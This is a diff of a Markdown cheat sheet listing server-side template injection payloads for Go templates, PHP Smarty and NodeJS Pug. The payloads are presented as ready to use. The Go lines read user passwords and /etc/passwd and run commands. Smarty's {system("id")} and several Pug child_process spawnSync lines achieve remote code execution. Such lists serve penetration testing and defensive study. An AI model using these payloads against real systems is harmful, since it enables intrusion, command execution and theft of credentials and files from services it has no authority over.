@@ -18,20 +18,34 @@
 
 ## Go SSTI
 
-### 1) {{ .Password }} (Fetches the passwords of all users) Hint: It depends on the struct the application has been made of to use the correct one! 
+#### 1) {{ .Password }} (Fetches the passwords of all users) Hint: It depends on the struct the application has been made of to use the correct one! 
 
-### 2) {{ .GetFile "/etc/passwd" }} (Gets the passwd linux file)
+#### 2) {{ .GetFile "/etc/passwd" }} (Gets the passwd linux file)
 
-### 3) {{ .ExecuteCmd "whoami" }} Executes commands
+#### 3) {{ .ExecuteCmd "whoami" }} Executes commands
 
-### 4) {{ . }} (Dumps variables)
+#### 4) {{ . }} (Dumps variables)
 
 ## PHP - Smarty
 
-### PoC Enumeration Payload
+#### PoC Enumeration Payload
 
     {'Hello'|upper}
   
-### RCE Payload
+#### RCE Payload
 
     {system("id")}
+
+## NodeJS - Pug
+
+### PoC Payload
+
+    #{7*7}
+
+### RCE Payload
+
+    #{root.process.mainModule.require('child_process').spawnSync('id').stdout}
+
+### SpawnSync RCE Payload with arguments
+
+    #{root.process.mainModule.require('child_process').spawnSync('ls', ['-lah']).stdout}
